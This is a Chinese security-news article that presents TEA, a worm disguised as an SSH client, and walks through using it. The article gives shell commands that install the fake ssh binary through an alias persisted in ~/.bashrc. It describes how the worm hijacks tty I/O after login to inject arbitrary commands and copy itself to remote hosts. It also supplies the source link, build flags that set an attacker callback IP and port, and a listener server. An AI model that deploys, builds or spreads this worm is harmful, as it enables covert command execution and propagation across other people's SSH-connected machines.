![](https://image.3001.net/images/20200330/1585571045_5e81e4e5d8e19.png!small)

**TEA是一款基于TAS框架的SSH客户端蠕虫，从本质上说，它是一个仿冒的SSH客户端，它能够修改tty输入/输出来实现任意命令执行，或通过SSH连接来上传自身以实现渗透感染。**

为了实现该工具的正常功能，远程主机需要满足以下条件：

> 1、在登录时显示“Last login”信息；
>
> 2、dd和stty；
>
> 3、目标用户使用Bash作为默认Shell；
>
> 4、可运行fakessh代码；
>
> 5、~/.bashrc可写入；

感染本地主机：

    
    
    mkdir ~/.sshworm
    
    cp ssh ~/.sshworm
    
    alias ssh='~/.sshworm/ssh'

我们首次执行fakessh时，并不会显示任何内容，工具会执行post-install.c中的代码，并将字符串alias
ssh="~/.sshworm/ssh"写入到~/.bashrc中：

    
    
    $ ssh
    
    $ ssh
    
    usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]
    
    [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]
    
    [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]
    
    [-i identity_file] [-J [user@]host[:port]] [-L address]
    
    [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
    
    [-Q query_option] [-R address] [-S ctl_path] [-W host:port]
    
    [-w local_tun[:remote_tun]] destination [command]

## 实现传播和感染

我们只需要连接到目标SSH服务器，并且服务器满足TEA运行条件的话，目标设备以及连接至目标设备的主机就可以成功被感染。

### tty修改：

Fakessh执行之后，它将会等到字符串“Last login”来开启I/O修改（output-hooks.c），当接收到“Last
login”之后，它将会发送一些任意指令（inject-cmd.c），然后等待命令执行的结果（output-hooks.c）。如果远程设备中不存在文件~/.sshworm/ssh的话，蠕虫将会上传自身（upload.c）。

### 卸载：

    
    
    $ rm -rf ~/.sshworm
    
    $ perl -i -pe 's;alias ssh="~/.sshworm/ssh";;g' ~/.bashrc
    
    $ unalias ssh

## 编译

我建议大家使用[ _musl-libc_](https://www.musl-libc.org/how.html)，或其他的libc，但我不建议大家使用glibc，因为使用glibc编译的代码会非常大。

### 获取源码：

$ git clone --recurse-submodules <https://github.com/hc0d3r/tea>

### 构建选项：

 **名称**|  **介绍**  
---|---  
IP| 远程IPv4 连接  
PORT| 远程port 连接  
  
### 样例：

$ make CC=musl-gcc IP=my-ipv4 PORT=1234

## 服务器

这里我们制作了一个简单的服务器来处理链接，当post-install.c的代码被执行之后，服务器将会接收到链接。服务器机制非常简单，当新链接建立成功之后，它将会执行一条新的命令并通过命令行传递链接文件描述符，这样才能保证执行的程序能够处理链接。

### 编译：

    
    
    $ cd server
    
    $ make
    
    cc -Wall -Wextra -O3 -c net.c -o net.o
    
    cc -Wall -Wextra -O3 -c replace.c -o replace.o
    
    cc -Wall -Wextra -O3 -c term.c -o term.o
    
    cc -Wall -Wextra -O3 -c main.c -o main.o
    
    cc -Wall -Wextra -O3 -o server net.o replace.o term.o main.o

## 工具演示

![](https://image.3001.net/images/20200330/1585571199_5e81e57f82ac1.jpg!small)

## 项目地址

> TEA：【[ _GitHub传送门_](https://github.com/hc0d3r/tea)】

 *** 参考来源：[
_hc0d3r_](https://github.com/hc0d3r/tea)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

